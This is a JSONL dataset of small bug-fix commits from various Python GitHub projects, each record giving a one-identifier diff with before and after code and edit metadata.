{"project": "ddd-utils", "commit_sha": "47baa5937685aed490f453066400d29ccc9369c3", "parent_sha": "f32235b1206e48c93d7b5a0fcbfca4a60d4b6a1e", "file_path": "src/dddUtils/ioOBJ.py", "project_url": "https://github.com/inconvergent/ddd-utils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2,7 +2,7 @@\n \n def load(fn):\n \n-  from codecs import open_2d\n+  from codecs import open\n   from numpy import row_stack\n \n   vertices = []\n", "before": "from codecs import open_2d", "after": "from codecs import open", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:open_2d\", 3, 22, 3, 29], \"open\"]]"}
{"project": "weblyzard_api", "commit_sha": "1ab7a515f6b9b42dbd8c3ec1438b43ff809fbc0c", "parent_sha": "b649cd75672233bb7b1ef3afb450723682730296", "file_path": "src/python/weblyzard_api/client/fuseki.py", "project_url": "https://github.com/weblyzard/weblyzard_api", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -346,7 +346,7 @@ class FusekiWrapper(object):\n                     break\n             sub_list = [self.fix_uri(t) for t in sub_list]\n             triples = '.\\n'.join([' '.join(triple) for triple in sub_list])\n-            graph_specification = f'graph <{graph_name}>' if graph else ''\n+            graph_specification = f'graph <{graph_name}>' if graph_name else ''\n", "before": "graph_specification = f'graph <{graph_name}>' if graph else ''", "after": "graph_specification = f'graph <{graph_name}>' if graph_name else ''", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:graph\", 3, 62, 3, 67], \"graph_name\"]]"}
{"project": "weblyzard_api", "commit_sha": "ccf1fc67834f9350cb1ba21c8310d78d5cddb4da", "parent_sha": "2a3427b4f71ea3eb6d5e1086b77a6d0088a52252", "file_path": "src/python/weblyzard_api/client/fuseki.py", "project_url": "https://github.com/weblyzard/weblyzard_api", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -351,7 +351,7 @@ class FusekiWrapper(object):\n             INSERT DATA {{\n               {graph_specification} {{ {triples} }}\n             }}\n-            \"\"\".format(graph_specification=graph_graph_specification,\n+            \"\"\".format(graph_specification=graph_specification,\n                        triples=triples)\n             lower = upper\n             upper = min(num_triples, upper + slice_size)\n", "before": "\"\" . format ( graph_specification = graph_graph_specification , triples = triples )", "after": "\"\" . format ( graph_specification = graph_specification , triples = triples )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:graph_graph_specification\", 3, 44, 3, 69], \"graph_specification\"]]"}
{"project": "uberserver", "commit_sha": "47506f7fab91a620fca6830d8768024fcdab9593", "parent_sha": "cd9922cb0f1bad3e3b7ace0b84c9502b01f485d2", "file_path": "MutexDict.py", "project_url": "https://github.com/lunixbochs/uberserver", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -32,7 +32,7 @@ class MutexDict:\n \t\tlock = self.lock(lock)\n \t\tdata = len(self.data)\n \t\tself.unlock(lock)\n-\t\treturn len\n+\t\treturn data\n \t\n \tdef __getitem__(self, key, lock=None):\n \t\tlock = self.lock(lock)\n", "before": "return len", "after": "return data", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:len\", 3, 10, 3, 13], \"data\"]]"}
{"project": "pluginmanager", "commit_sha": "1f1779e4fb59faccfbfaa9dbbf37bf235bda66c8", "parent_sha": "3855e68b6d1101e769f644d4eafcf758ac3d5bd9", "file_path": "simpleyapsy/directory_manager.py", "project_url": "https://github.com/benhoff/pluginmanager", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -31,7 +31,7 @@ class DirectoryManager(object):\n         except AttributeError:\n             # getsitepackages is broken with virtualenvs\n             # https://github.com/pypa/virtualenv/issues/355\n-            from distuils.sysconfig import get_python_lib\n+            from distutils.sysconfig import get_python_lib\n             self.add_directories(get_python_lib())\n \n     def get_directories(self):\n", "before": "AttributeError : from distuils . sysconfig", "after": "AttributeError : from distutils . sysconfig", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:distuils\", 3, 18, 3, 26], \"distutils\"]]"}
{"project": "pluginmanager", "commit_sha": "dfd01a608a94f1403d48021a442647b287f79efa", "parent_sha": "a2587d3ea735de281e9d5795c4378463b0cde186", "file_path": "pluginmanager/plugin_filters/by_name.py", "project_url": "https://github.com/benhoff/pluginmanager", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -5,7 +5,7 @@ def by_name(plugins, names):\n     names = util.return_list(names)\n     approved_plugins = []\n     for plugin in plugins:\n-        if hasattr(pluign, 'name') and plugin.name in names:\n+        if hasattr(plugin, 'name') and plugin.name in names:\n             approved_plugins.append(plugin)\n \n     return approved_plugins\n", "before": "if hasattr ( pluign , 'name' ) and plugin . name in names : approved_plugins . append ( plugin )", "after": "if hasattr ( plugin , 'name' ) and plugin . name in names : approved_plugins . append ( plugin )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:pluign\", 3, 20, 3, 26], \"plugin\"]]"}
{"project": "mldata", "commit_sha": "5a99680b5ebdb25f01191ab233dc21a7a108cfa9", "parent_sha": "72ec23875610a6257b7da176e4ea40a458d484c7", "file_path": "utils/hdf5conv/__init__.py", "project_url": "https://github.com/open-machine-learning/mldata", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -224,7 +224,7 @@ class HDF5():\n             if self.is_binary(fname):\n                 data = ''\n             else:\n-                file = open(fame, 'r')\n+                file = open(fname, 'r')\n                 i = 0\n                 data = []\n                 for line in file:\n", "before": "file = open ( fame , 'r' )", "after": "file = open ( fname , 'r' )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:fame\", 3, 29, 3, 33], \"fname\"]]"}
{"project": "katal", "commit_sha": "08b3edeb2142136a0f857a185d483ccc75ae2591", "parent_sha": "10a3ce9acade67f2bcff19eeb8560aa3c4a87dec", "file_path": "katal/katal.py", "project_url": "https://github.com/suizokukan/katal", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1053,7 +1053,7 @@ def fill_select(_debug_datatime=None):\n                     \": incompatibility with the sieves\".format(prefix, fullname),\n                     _important_msg=False)\n             else:\n-                tobeadded, partialhashid, hashid = thefilehastobeadded__db(filename, size, time)\n+                tobeadded, partialhashid, hashid = thefilehastobeadded__db(fullname, size, time)\n \n                 if tobeadded:\n                     # ok, let's add <filename> to SELECT...\n", "before": "_important_msg = False ) else : tobeadded , partialhashid , hashid = thefilehastobeadded__db ( filename , size , time )", "after": "_important_msg = False ) else : tobeadded , partialhashid , hashid = thefilehastobeadded__db ( fullname , size , time )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:filename\", 3, 76, 3, 84], \"fullname\"]]"}
{"project": "plagiabot", "commit_sha": "da2c3e032428a1b9977aef65bc0cba067fa41af1", "parent_sha": "8b8679366084319ef58307b175892f84c82bfd5f", "file_path": "plagiabot.py", "project_url": "https://github.com/valhallasw/plagiabot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -420,7 +420,7 @@ def articles_from_talk_template(site, talk_template, namespace=1):\n                 page_namespace=1\n         where \n                 tl_title='%s' and\n-                tl_namespace=10 and tl_from_namespace=%st\n+                tl_namespace=10 and tl_from_namespace=%s\n", "before": "tl_title = '%s' and tl_namespace = 10 and tl_from_namespace = % st", "after": "tl_title = '%s' and tl_namespace = 10 and tl_from_namespace = % s", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:st\", 3, 56, 3, 58], \"s\"]]"}
{"project": "pluginmanager", "commit_sha": "495526867009e22a56b9797d77f665ef98afa8a5", "parent_sha": "2aac990cc5b49142eb9b8b0f0867104155eb36a6", "file_path": "package/yapsy/PluginManager.py", "project_url": "https://github.com/benhoff/pluginmanager", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -501,7 +501,7 @@ class PluginManager(object):\n \t\t\t\tfor category_name in self.categories_interfaces:\n \t\t\t\t\ttry:\n \t\t\t\t\t\tis_correct_subclass = issubclass(element, self.categories_interfaces[category_name])\n-\t\t\t\t\texcept TypeError:\n+\t\t\t\t\texcept Exception:\n \t\t\t\t\t\tcontinue\n \t\t\t\t\tif is_correct_subclass and element is not self.categories_interfaces[category_name]:\n \t\t\t\t\t\t\tcurrent_category = category_name\n", "before": "try : is_correct_subclass = issubclass ( element , self . categories_interfaces [ category_name ] ) except TypeError : continue", "after": "try : is_correct_subclass = issubclass ( element , self . categories_interfaces [ category_name ] ) except Exception : continue", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:TypeError\", 3, 13, 3, 22], \"Exception\"]]"}
{"project": "databroker", "commit_sha": "8b226c06aa58b76f7216c9d158ec86b861d2de74", "parent_sha": "b34cbc637c0c317b7347ae327433282417b887e0", "file_path": "databroker/_core.py", "project_url": "https://github.com/bluesky/databroker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -493,7 +493,7 @@ def register_builtin_handlers(reg):\n \n def _register_builtin_handler(reg, hdlr):\n     for spec in hdlr.specs:\n-        logger.debug(\"Registering Handler %r for spec %r\", cls, spec)\n+        logger.debug(\"Registering Handler %r for spec %r\", hdlr, spec)\n         reg.register_handler(spec, hdlr)\n \n     #for cls in vars(handlers).values():\n", "before": "logger . debug ( \"Registering Handler %r for spec %r\" , cls , spec )", "after": "logger . debug ( \"Registering Handler %r for spec %r\" , hdlr , spec )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:cls\", 3, 60, 3, 63], \"hdlr\"]]"}
{"project": "databroker", "commit_sha": "728e11321b400457cdf9f91b7f4e3665b50ebd45", "parent_sha": "26d0e2e021ee0b8c3c617a3d702e73b47cb50291", "file_path": "intake_bluesky.py", "project_url": "https://github.com/bluesky/databroker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -117,7 +117,7 @@ class MongoMetadataStoreCatalog(intake.catalog.Catalog):\n                 # If this came from a client, we might be getting '-1'.\n                 try:\n                     name = int(name)\n-                except TypeError:\n+                except ValueError:\n                     pass\n                 if isinstance(name, int):\n                     if name < 0:\n", "before": "try : name = int ( name ) except TypeError : pass", "after": "try : name = int ( name ) except ValueError : pass", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:TypeError\", 3, 24, 3, 33], \"ValueError\"]]"}
{"project": "openbci", "commit_sha": "bd7a9695a9d3d56398471f6a626e4bfc7765e796", "parent_sha": "1700679b0d5e1dc11a3229f6edddd27b459389fb", "file_path": "exps/ventures/maze_game/maze_level.py", "project_url": "https://github.com/BrainTech/openbci", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -93,7 +93,7 @@ class MazeLevel(object):\n         self._init_level_arrays(level)\r\n         self._init_path()\r\n         if level_type == 'T':\r\n-            self.level = elf.level.T\r\n+            self.level = self.level.T\r\n             self.level_path = self.level_path.T\r\n         elif level_type == 'T->':\r\n             self.level = np.array([row[::-1] for row in self.level]).T\r\n", "before": "self . level = elf . level . T", "after": "self . level = self . level . T", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:elf\", 3, 26, 3, 29], \"self\"]]"}
{"project": "fabrack", "commit_sha": "acf81cdf1c7ec66a5bcd86f97491cb45ba8a55e5", "parent_sha": "b78a6f5da74e6e1fca8c8200bf6d7989d21e97ba", "file_path": "src/fabrack/utils.py", "project_url": "https://github.com/DavidWittman/fabrack", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -52,4 +52,4 @@ def make_roles(rdict, path=None):\n     for (key, value) in rdict.iteritems():\n       if value in server['name']:\n         env.roledefs[key].append(server['addresses'][ip_type][0])\n-        env.roledefs['all'].append(servers['addresses'][ip_type][0])\n+        env.roledefs['all'].append(server['addresses'][ip_type][0])\n", "before": "env . roledefs [ 'all' ] . append ( servers [ 'addresses' ] [ ip_type ] [ 0 ] )", "after": "env . roledefs [ 'all' ] . append ( server [ 'addresses' ] [ ip_type ] [ 0 ] )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:servers\", 3, 36, 3, 43], \"server\"]]"}
{"project": "pdfminer", "commit_sha": "3da04c0a04b23bee20ee89a7c989838b094e3139", "parent_sha": "3f18a74e9cdc6398d3d5a6827175cb551b509316", "file_path": "pdfminer/converter.py", "project_url": "https://github.com/metachris/pdfminer", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -128,7 +128,7 @@ class PDFPageAggregator(PDFTextDevice):\n       (x0,y0) = apply_matrix_pt(self.ctm, (x0,y0))\n       (x1,y1) = apply_matrix_pt(self.ctm, (x1,y1))\n       (x2,y2) = apply_matrix_pt(self.ctm, (x2,y2))\n-      (x3,y3) = apply_matrix_pt(self.ctm, (x3,y2))\n+      (x3,y3) = apply_matrix_pt(self.ctm, (x3,y3))\n       if ((x0 == x1 and y1 == y2 and x2 == x3 and y3 == y0) or\n           (y0 == y1 and x1 == x2 and y2 == y3 and x3 == x0)):\n         self.cur_item.add(LTRect(gstate.linewidth, (x0,y0,x2,y2)))\n", "before": "( x3 , y3 ) = apply_matrix_pt ( self . ctm , ( x3 , y2 ) )", "after": "( x3 , y3 ) = apply_matrix_pt ( self . ctm , ( x3 , y3 ) )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:y2\", 3, 47, 3, 49], \"y3\"]]"}
{"project": "pcircle", "commit_sha": "95f41f4698a50b4fa0593d66a3ebf33ce67d7484", "parent_sha": "8e2eb2a508e52a0a9cfe1a46bcbb4ce6aa1bec7c", "file_path": "pcircle/fwalk.py", "project_url": "https://github.com/olcf/pcircle", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -154,8 +154,8 @@ class FWalk(BaseTask):\n         except OSError as e:\n             self.logger.warn(\"mknod() for %s, %s\" %(dest_file, e), extra=self.d)\n             return\n-        \n-        if self.preserve:\n+\n+        if G.preserve:\n             self.copy_xattr(src_file, dest_file)\n \n     def check_dest_exists(self, src_file, dest_file):\n", "before": "if self . preserve : self . copy_xattr ( src_file , dest_file )", "after": "if G . preserve : self . copy_xattr ( src_file , dest_file )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:self\", 4, 12, 4, 16], \"G\"]]"}
{"project": "django-tag-tools", "commit_sha": "fa8196cf05422a4766d639ad62c029b0e3e2954e", "parent_sha": "0aa4a1d80a096c9f072096e3bbc5c88f63dff255", "file_path": "tagtools/backends/taggit/views.py", "project_url": "https://github.com/kaleissin/django-tag-tools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -39,7 +39,7 @@ class ListTaggedView(ListView):\n             self.tag_instance = Tag.objects.get(slug=tag)\n         except Tag.DoesNotExist:\n             raise Http404(_('No Tag found matching \"%s\".') % tag)\n-        _, model = _get_queryset_and_model(queryset_or_model)\n+        qs, model = _get_queryset_and_model(queryset_or_model)\n         ct_model = ContentType.objects.get_for_model(model)\n         ti_qs = TaggedItem.objects.filter(content_type=ct_model, tag=self.tag_instance)\n         queryset = model.objects.filter(pk__in=[o.object_id for o in ti_qs])\n", "before": "_ , model = _get_queryset_and_model ( queryset_or_model )", "after": "qs , model = _get_queryset_and_model ( queryset_or_model )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:_\", 3, 9, 3, 10], \"qs\"]]"}
{"project": "operationcode-pybot", "commit_sha": "35f503b3adfc007e975421521d6652e7aa78df82", "parent_sha": "9b8e4ac994db7af4432502be2303764c980ab289", "file_path": "pybot/endpoints/slack/utils/slash_lunch.py", "project_url": "https://github.com/OperationCode/operationcode-pybot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -10,7 +10,7 @@ class LunchCommand:\n     DEFAULT_LUNCH_DISTANCE = 20\n     MIN_LUNCH_RANGE = 0.5\n \n-    def __init__(self, channel: str, user_id: str, slack: str, input_text: str, user_name: str):\n+    def __init__(self, channel: str, user: str, slack: str, input_text: str, user_name: str):\n \n         self.channel_id = channel\n         self.user_id = user\n", "before": "def __init__ ( self , channel : str , user_id : str , slack : str , input_text : str , user_name : str ) : self . channel_id = channel self . user_id = user", "after": "def __init__ ( self , channel : str , user : str , slack : str , input_text : str , user_name : str ) : self . channel_id = channel self . user_id = user", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:user_id\", 3, 38, 3, 45], \"user\"]]"}
{"project": "lambdipy", "commit_sha": "14ab2b963cd89481e45ebffe9a8709bc43c6d8d7", "parent_sha": "012845699c88f44d10ce251de57739d1a9829459", "file_path": "lambdipy/project_build.py", "project_url": "https://github.com/customink/lambdipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -38,7 +38,7 @@ def get_requirements_from_pipenv(dev):\n         command = \"{ pipenv lock --dev -r & pipenv lock -r; }\"\n     else:\n         command = \"pipenv lock -r\"\n-    with os.popen(command) as subprocess:\n+    with os.popen(command) as pipenv_subprocess:\n         return pipenv_subprocess.read()\n \n \n", "before": "with os . popen ( command ) as subprocess : return pipenv_subprocess . read ( )", "after": "with os . popen ( command ) as pipenv_subprocess : return pipenv_subprocess . read ( )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:subprocess\", 3, 31, 3, 41], \"pipenv_subprocess\"]]"}
{"project": "osi-addons", "commit_sha": "9217691e9610b0db0280d49c3df16ac1472a5996", "parent_sha": "f86ff4b9fd37ace83cc876ac79dd5501eb8c4e83", "file_path": "osi_analytic_segments_defaults/models/account_invoice_line.py", "project_url": "https://github.com/ursais/osi-addons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -21,7 +21,7 @@ class AccountInvoiceLine(models.Model):\n     def _set_additional_fields(self, invoice):\n         rec = self.env['account.analytic.default'].account_get(\n             self.product_id.id, self.invoice_id.partner_id.id,\n-            self.env.uid, fields.Date.today(), company_id=self.company_id.id)\n+            self.env.uid, fields.Date.today(), company_id=invoice.company_id.id)\n         if rec and not self.analytic_segment_one_id:\n             self.analytic_segment_one_id = rec.analytic_segment_one_id.id\n         if rec and not self.analytic_segment_two_id:\n", "before": "rec = self . env [ 'account.analytic.default' ] . account_get ( self . product_id . id , self . invoice_id . partner_id . id , self . env . uid , fields . Date . today ( ) , company_id = self . company_id . id )", "after": "rec = self . env [ 'account.analytic.default' ] . account_get ( self . product_id . id , self . invoice_id . partner_id . id , self . env . uid , fields . Date . today ( ) , company_id = invoice . company_id . id )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:self\", 3, 59, 3, 63], \"invoice\"]]"}
{"project": "SymPortal_framework", "commit_sha": "257255f74a7a8e5864765ab9c40cdd717e53d189", "parent_sha": "c61e555e0bf1b4ea3fe313de9b7f130f578279e8", "file_path": "create_data_submission.py", "project_url": "https://github.com/SymPortal/SymPortal_framework", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -728,7 +728,7 @@ def checkIfSeqInQHadRefSeqMatch(seqInQ, nodeName, refSeqIdDict, nodeToRefDict, r\n                 # Then this is a match\n                 nodeToRefDict[nodeName] = refSeqIdDict[ref_seq_key]\n                 print('Assigning MED node {} to existing reference sequence {}'.format(\n-                    nodeName, refSeqIdDict[refSeqIdDict[ref_seq_key]]))\n+                    nodeName, refSeqIDNameDict[refSeqIdDict[ref_seq_key]]))\n                 return True\n     return False\n \n", "before": "print ( 'Assigning MED node {} to existing reference sequence {}' . format ( nodeName , refSeqIdDict [ refSeqIdDict [ ref_seq_key ] ] ) )", "after": "print ( 'Assigning MED node {} to existing reference sequence {}' . format ( nodeName , refSeqIDNameDict [ refSeqIdDict [ ref_seq_key ] ] ) )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:refSeqIdDict\", 3, 31, 3, 43], \"refSeqIDNameDict\"]]"}
{"project": "SymPortal_framework", "commit_sha": "d5c092df1787738f249eedbab6969168aaf1a96b", "parent_sha": "53b40c9e29603a56bdd8526824033353c45c8f41", "file_path": "create_data_submission.py", "project_url": "https://github.com/SymPortal/SymPortal_framework", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -728,7 +728,7 @@ def checkIfSeqInQHadRefSeqMatch(seqInQ, nodeName, refSeqIdDict, nodeToRefDict, r\n                 # Then this is a match\n                 nodeToRefDict[nodeName] = refSeqIdDict[ref_seq_key]\n                 print('Assigning MED node {} to existing reference sequence {}'.format(\n-                    nodeName, refSeqIdDict[refSeqIdDict[ref_seq_key]]))\n+                    nodeName, refSeqIDNameDict[refSeqIdDict[ref_seq_key]]))\n                 return True\n     return False\n \n", "before": "print ( 'Assigning MED node {} to existing reference sequence {}' . format ( nodeName , refSeqIdDict [ refSeqIdDict [ ref_seq_key ] ] ) )", "after": "print ( 'Assigning MED node {} to existing reference sequence {}' . format ( nodeName , refSeqIDNameDict [ refSeqIdDict [ ref_seq_key ] ] ) )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:refSeqIdDict\", 3, 31, 3, 43], \"refSeqIDNameDict\"]]"}
{"project": "udapi-python", "commit_sha": "0beaf583448c27202dc1b986988e1449ecd5bd66", "parent_sha": "67250cb2e29dd884c71a03ec10c53c4fabf6f9f4", "file_path": "udapi/block/ud/convert1to2.py", "project_url": "https://github.com/udapi/udapi-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -306,7 +306,7 @@ class Convert1to2(Block):\n         elif stored != computed:\n             normalized = ' '.join(stored.split())\n             if normalized != computed:\n-                root.text = normalized\n+                root.text = computed\n                 root.add_comment('ToDoOrigText = ' + stored)\n                 self.log(root, 'text', 'Sentence string does not agree with the stored text.')\n \n", "before": "root . text = normalized", "after": "root . text = computed", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:normalized\", 3, 29, 3, 39], \"computed\"]]"}
{"project": "bot", "commit_sha": "dacebe0535d2d71a6a8b0b001b7424be09071cb6", "parent_sha": "3bcdd30e7967ce28faab4130ed3872edf29123ac", "file_path": "hackserv.py", "project_url": "https://github.com/trackmastersteve/bot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -338,7 +338,7 @@ def nonExist(command):\n     errorMessage = str(command) +\" does not exist yet. Please go to \"+ github +\" if you feel like you can contribute.\"\n     if debugmode:\n         print(errorMessage)\n-    sendntc(errorMessgae, name)\n+    sendntc(errorMessage, name)\n     \n def persistence(): \n     # Startup Check. (Still in testing!)\n", "before": "sendntc ( errorMessgae , name )", "after": "sendntc ( errorMessage , name )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:errorMessgae\", 3, 13, 3, 25], \"errorMessage\"]]"}
{"project": "NiceLib", "commit_sha": "3184824e1d91fc24d46a7b016aaafc2d16ff5f05", "parent_sha": "e82f6b0d75f5d1901c446638f8680ecd399bddf3", "file_path": "nicelib/nicelib.py", "project_url": "https://github.com/mabuchilab/NiceLib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -701,7 +701,7 @@ class LibMeta(type):\n         # Add macro defs\n         if defs:\n             for name, attr in defs.items():\n-                for prefix in flags['prefix']:\n+                for prefix in base_flags['prefix']:\n                     if name.startswith(prefix):\n                         shortname = name[len(prefix):]\n                         if shortname in classdict:\n", "before": "for prefix in flags [ 'prefix' ] : if name . startswith ( prefix ) : shortname = name [ len ( prefix ) : ] if shortname in classdict : ", "after": "for prefix in base_flags [ 'prefix' ] : if name . startswith ( prefix ) : shortname = name [ len ( prefix ) : ] if shortname in classdict : ", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:flags\", 3, 31, 3, 36], \"base_flags\"]]"}
{"project": "bot", "commit_sha": "8df2602b6d296daf071f73993dfb0c921ac35cee", "parent_sha": "6daf6a782f7a13607df722708bf1b69aa99af6fe", "file_path": "bot.py", "project_url": "https://github.com/trackmastersteve/bot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -261,7 +261,7 @@ def main():\n                         message = \"The 'admin help menu' is coming soon!\"\n                     else:\n                         message = \"The 'help menu' is coming soon!\"\n-                    sendhelp(msg, name)\n+                    sendhelp(message, name)\n                 \n                 # Respond to '.ip' command from admin.\n                 if name.lower() == adminname.lower() and message.find('.ip') != -1:\n", "before": "sendhelp ( msg , name )", "after": "sendhelp ( message , name )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:msg\", 3, 30, 3, 33], \"message\"]]"}
{"project": "bot", "commit_sha": "1eb1e7a60356e7bfeff111aff87bc7d788c090d6", "parent_sha": "a151b48c9d39b425b4e88ce5ebeaa130fa95ec4b", "file_path": "bot.py", "project_url": "https://github.com/trackmastersteve/bot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -335,7 +335,7 @@ def main():\n             if ircmsg.find(\"PING\") != -1:\n                 nospoof = ircmsg.split(' ', 1)[1] # Unrealircd 'nospoof' compatibility.\n                 ircsock.send(bytes(\"PONG \" + nospoof +\"\\n\", \"UTF-8\"))\n-                last_ping = time.time()\n+                lastping = time.time()\n             if (time.time() - lastping) > threshold:\n                 connected = False\n                 break\n", "before": "last_ping = time . time ( )", "after": "lastping = time . time ( )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:last_ping\", 3, 17, 3, 26], \"lastping\"]]"}
{"project": "bot", "commit_sha": "67964985bbe57870c7fc5d7f7eea375f4140a354", "parent_sha": "334d7776e95444d42fa85cba5bb4aa8b72625e8e", "file_path": "bot.py", "project_url": "https://github.com/trackmastersteve/bot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -121,7 +121,7 @@ def reconnect():\n             ircsock.send(bytes(\"NICK \"+ botnick +\"\\n\", \"UTF-8\")) # Assign the nick to the bot.\n             connected = True\n             main()\n-        except Exception as ireconnex: # If you can't connect, wait 10 seconds and try again.\n+        except Exception as irconnex: # If you can't connect, wait 10 seconds and try again.\n             if debugmode: # If debugmode is True, msgs will print to screen.\n                 print(\"Exception: \" + str(irconnex))\n                 print(\"Failed to reconnect to \" + str(server) + \":\" + str(port) + \". Retrying in 10 seconds...\")\n", "before": "ireconnex : if", "after": "irconnex : if", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:ireconnex\", 3, 29, 3, 38], \"irconnex\"]]"}
{"project": "SymPortal_framework", "commit_sha": "ca00246edb99b8b6780dbd4b2b35396682cc25a0", "parent_sha": "02946e6466f8fec2713fd4966f88cff54ab78ccb", "file_path": "create_data_submission.py", "project_url": "https://github.com/SymPortal/SymPortal_framework", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2073,7 +2073,7 @@ def make_dot_stability_file_datasheet(fastq_file_to_sample_name_dict, list_of_na\n         temp_list.append(sample_name)\n         for k, v in fastq_file_to_sample_name_dict.items():\n             if v == sample_name:\n-                temp_list.append(v)\n+                temp_list.append(k)\n         assert (len(temp_list) == 3)\n         sample_fastq_pairs.append('\\t'.join(temp_list))\n     write_list_to_destination(r'{0}/stability.files'.format(wkd), sample_fastq_pairs)\n", "before": "temp_list . append ( v )", "after": "temp_list . append ( k )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:v\", 3, 34, 3, 35], \"k\"]]"}
{"project": "sparsebak", "commit_sha": "428aa8ce3f0ab9e36ee572413211bd7b6ba14de3", "parent_sha": "f448bd098a3111c275e1e53b89ba9ea4b98853ef", "file_path": "sparsebak.py", "project_url": "https://github.com/tasket/sparsebak", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -154,7 +154,7 @@ def get_lvm_deltas():\n                     + \" /dev/mapper/\"+vgname+\"-\"+poolname+\"_tmeta\" \\\n                     + \" | grep -v '<same .*\\/>$'\" ]\n                 #print(cmd[0])\n-                subprocess.check_call(aaa, shell=True, stdout=f)\n+                subprocess.check_call(cmd, shell=True, stdout=f)\n         except:\n             td_err = True\n     subprocess.check_call([\"dmsetup\",\"message\", vgname+\"-\"+poolname+\"-tpool\", \\\n", "before": "+ \" /dev/mapper/\" + vgname + \"-\" + poolname + \"_tmeta\" + \" | grep -v '<same .*\\/>$'\" ] subprocess . check_call ( aaa , shell = True , stdout = f )", "after": "+ \" /dev/mapper/\" + vgname + \"-\" + poolname + \"_tmeta\" + \" | grep -v '<same .*\\/>$'\" ] subprocess . check_call ( cmd , shell = True , stdout = f )", "sstub_pattern": "CHANGE_IDENTIFIER_USED", "edit_script": "[[\"Update\", [\"identifier:aaa\", 3, 39, 3, 42], \"cmd\"]]"}
